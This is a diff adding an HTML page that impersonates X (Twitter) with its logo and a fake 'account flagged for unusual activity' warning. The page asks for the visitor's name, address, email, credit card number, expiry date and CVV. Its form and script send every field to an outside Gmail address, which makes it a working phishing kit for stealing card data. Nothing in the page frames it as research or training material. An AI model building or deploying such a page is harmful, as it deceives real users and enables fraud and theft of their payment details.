@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Verification Form</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .form-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 600px; /* Increased max-width for more fields */
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #374151;
+        }
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"], /* For phone numbers */
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #374151;
+            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+        }
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="tel"]:focus,
+        textarea:focus {
+            outline: none;
+            border-color: #4f46e5;
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.2);
+        }
+        textarea {
+            resize: vertical;
+            min-height: 80px; /* Slightly reduced for address */
+        }
+        .grid-cols-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        .grid-cols-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+        }
+        .submit-button {
+            width: 100%;
+            padding: 14px;
+            background-color: #000000; /* Changed to black for X logo */
+            color: #ffffff;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: background-color 0.2s ease-in-out, transform 0.1s ease-in-out;
+        }
+        .submit-button:hover {
+            background-color: #333333;
+            transform: translateY(-1px);
+        }
+        .submit-button:active {
+            transform: translateY(0);
+        }
+        .x-logo {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .x-logo img { /* Updated style for img tag */
+            width: 48px;
+            height: 48px;
+            /* SVG fill color is handled by the SVG itself, no need for fill property here */
+        }
+        .flagged-message {
+            background-color: #fffbeb;
+            border: 1px solid #f59e0b;
+            color: #b45309;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            font-weight: 500;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <div class="x-logo">
+            <!-- X Logo Image -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/X_logo_2023_original.svg" alt="X Logo" onerror="this.onerror=null;this.src='https://placehold.co/48x48/cccccc/000000?text=X';" />
+        </div>
+        <h2 class="text-3xl font-bold text-center text-gray-800 mb-8">Account Verification</h2>
+
+        <div class="flagged-message">
+            Your account has been flagged for unusual activity. Please verify your identity by providing the requested credit card information below to regain full access.
+        </div>
+
+        <form id="paymentForm" action="mailto:str8owner404@gmail.com?subject=Identity%20Verification%20Form%20Submission" method="post" enctype="text/plain">
+            <!-- Payer Information -->
+            <h3 class="text-2xl font-semibold text-gray-700 mb-6 mt-8">Payer Details</h3>
+            <div class="form-group">
+                <label for="fullName">Full Name:</label>
+                <input type="text" id="fullName" name="Payer_Full_Name" placeholder="Jane Doe" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email Address:</label>
+                <input type="email" id="email" name="Payer_Email" placeholder="jane.doe@example.com" required>
+            </div>
+            <div class="form-group">
+                <label for="address1">Address Line 1:</label>
+                <input type="text" id="address1" name="Payer_Address_Line_1" placeholder="123 Main St" required>
+            </div>
+            <div class="form-group">
+                <label for="address2">Address Line 2 (Optional):</label>
+                <input type="text" id="address2" name="Payer_Address_Line_2" placeholder="Apt 4B">
+            </div>
+            <div class="grid-cols-2">
+                <div class="form-group">
+                    <label for="city">City:</label>
+                    <input type="text" id="city" name="Payer_City" placeholder="Anytown" required>
+                </div>
+                <div class="form-group">
+                    <label for="state">State/Province:</label>
+                    <input type="text" id="state" name="Payer_State_Province" placeholder="CA" required>
+                </div>
+            </div>
+            <div class="grid-cols-2">
+                <div class="form-group">
+                    <label for="postalCode">Postal Code:</label>
+                    <input type="text" id="postalCode" name="Payer_Postal_Code" placeholder="90210" required>
+                </div>
+                <div class="form-group">
+                    <label for="country">Country:</label>
+                    <input type="text" id="country" name="Payer_Country" placeholder="USA" required>
+                </div>
+            </div>
+
+            <!-- Credit Card Information -->
+            <h3 class="text-2xl font-semibold text-gray-700 mb-6 mt-8">Credit Card Details</h3>
+            <div class="form-group">
+                <label for="cardNumber">Credit Card Number:</label>
+                <input type="text" id="cardNumber" name="Credit_Card_Number" placeholder="XXXX XXXX XXXX XXXX" title="Credit card number must be 13 to 19 digits" required>
+            </div>
+            <div class="grid-cols-3">
+                <div class="form-group">
+                    <label for="expMonth">Valid Thru (MM):</label>
+                    <input type="text" id="expMonth" name="Card_Expiry_Month" placeholder="MM" pattern="(0[1-9]|1[0-2])" title="Two-digit month (01-12)" required>
+                </div>
+                <div class="form-group">
+                    <label for="expYear">Valid Thru (YY):</label>
+                    <input type="text" id="expYear" name="Card_Expiry_Year" placeholder="YY" pattern="\d{2}" title="Two-digit year (e.g., 25)" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV:</label>
+                    <input type="text" id="cvv" name="Card_CVV" placeholder="XXX" pattern="\d{3,4}" title="3 or 4 digits" required>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-button">Verify Identity</button>
+        </form>
+    </div>
+
+    <script>
+        // Client-side validation for card number formatting
+        document.getElementById('cardNumber').addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+        });
+
+        // Manual mailto link generation on form submission
+        document.getElementById('paymentForm').addEventListener('submit', function(event) {
+            // Prevent the default form submission (which would normally trigger mailto directly)
+            event.preventDefault();
+
+            const form = event.target;
+            const formData = new FormData(form);
+            let body = '';
+
+            // Construct the email body from form data
+            for (let [name, value] of formData.entries()) {
+                // Exclude the submit button's name if it were part of formData
+                if (name !== 'submit') {
+                    body += `${name}: ${value}\n`;
+                }
+            }
+
+            const subject = encodeURIComponent('Identity Verification Form Submission');
+            const toEmail = 'str8owner404@gmail.com';
+            const mailtoLink = `mailto:${toEmail}?subject=${subject}&body=${encodeURIComponent(body)}`;
+
+            // Attempt to open the mailto link
+            window.location.href = mailtoLink;
+
+            // Optional: Provide user feedback that email client should open
+            // alert('Your email client should open now with the pre-filled information. Please click "Send" to complete the verification.');
+        });
+    </script>
+</body>
+</html>
